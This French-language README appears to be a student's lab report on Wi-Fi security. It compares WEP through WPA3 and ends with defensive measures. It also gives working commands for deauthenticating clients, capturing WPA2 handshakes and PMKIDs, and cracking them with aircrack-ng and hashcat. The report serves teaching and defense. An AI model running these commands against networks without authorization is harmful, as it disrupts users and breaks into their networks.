<div align="center">

![Header](https://capsule-render.vercel.app/api?type=waving&color=0:0d1117,100:00f2ff&height=120&section=header&text=&fontSize=0)

</div>

# 📡 Wireless Security — Concepts, Attaques & Défense

<div align="center">

![WiFi](https://img.shields.io/badge/IEEE_802.11-WPA2/WPA3-00b4d8?style=for-the-badge&logo=wifi&logoColor=white) ![Aircrack](https://img.shields.io/badge/Aircrack--ng-CC0000?style=for-the-badge&logo=linux&logoColor=white) ![Wireshark](https://img.shields.io/badge/Wireshark-1679A7?style=for-the-badge&logo=wireshark&logoColor=white) ![Kali Linux](https://img.shields.io/badge/Kali_Linux-557C94?style=for-the-badge&logo=kalilinux&logoColor=white)

![Efrei](https://img.shields.io/badge/Efrei_Bordeaux-Mastère_Cybersécurité-purple?style=flat-square) ![Type](https://img.shields.io/badge/Type-Wireless_Security_Research-blue?style=flat-square) ![Status](https://img.shields.io/badge/Status-Terminé-success?style=flat-square)

> ⚠️ **Avertissement légal** : Ce projet est réalisé dans un environnement de laboratoire contrôlé à des fins strictement pédagogiques.

</div>

---

## 🎯 Introduction

Étude technique sur l'exploitation et la sécurisation des réseaux IEEE 802.11. Ce rapport couvre les protocoles de sécurité Wi-Fi, les techniques d'attaque courantes et les contre-mesures à mettre en place.

---

## 🌐 Technologies & Protocoles

| Protocole | Sécurité | Vulnérabilités |
| :--- | :--- | :--- |
| **WEP** | Très faible | RC4 cassable en < 5 min |
| **WPA** | Faible | TKIP vulnérable, KRACK |
| **WPA2** | Moyen | Attaques dictionnaire sur handshake |
| **WPA3** | Fort | SAE résiste au brute-force offline |

---

## 🤝 Le Handshake WPA2

Le handshake 4-way est la cible principale des attaques sur WPA2-Personal.

```bash
# 1. Passer en mode moniteur
airmon-ng start wlan0

# 2. Scanner les réseaux environnants
airodump-ng wlan0mon

# 3. Capturer le handshake (attendre ou forcer une déauth)
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# 4. Forcer la reconnexion d'un client
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon
```

---

## 🛠️ Méthodologie d'Attaque

### Attaque par dictionnaire sur WPA2

```bash
# Crack du handshake capturé avec une wordlist
aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt

# Alternative avec hashcat (GPU)
hashcat -m 22000 capture.hccapx wordlist.txt
```

### Evil Twin (Faux Point d'Accès)

Création d'un AP clone pour intercepter les connexions via hostapd + dnsmasq.

### PMKID Attack (WPA2 sans client)

```bash
# Capture du PMKID sans attendre un client
hcxdumptool -i wlan0mon --enable_status=3 -o capture.pcapng

# Conversion et crack
hcxpcapngtool -o hash.hc22000 capture.pcapng
hashcat -m 22000 hash.hc22000 wordlist.txt
```

---

## 🛡️ Stratégies de Défense

| Mesure | Description |
| :--- | :--- |
| **WPA3 Enterprise** | Authentification 802.1X + certificats |
| **Mots de passe forts** | +20 caractères aléatoires |
| **WIDS/WIPS** | Détection d'APs non autorisés |
| **Segmentation VLAN** | Isolation du réseau Wi-Fi invité |
| **VPN obligatoire** | Chiffrement applicatif en complément |

---

## 🏁 Conclusion

La sécurité Wi-Fi repose avant tout sur le choix du protocole (WPA3 recommandé), la robustesse des mots de passe et la surveillance active du réseau. WPA2 reste exploitable via des attaques dictionnaire si la passphrase est faible.

---

<div align="center">

[![Portfolio](https://img.shields.io/badge/Portfolio-00f2ff?style=for-the-badge&logo=firefox&logoColor=black)](https://kim-san04.github.io) [![LinkedIn](https://img.shields.io/badge/LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white)](https://linkedin.com/in/hakim-sawadogo) [![GitHub](https://img.shields.io/badge/GitHub-181717?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Kim-San04)

![Footer](https://capsule-render.vercel.app/api?type=waving&color=0:00f2ff,100:0d1117&height=80&section=footer)

</div>
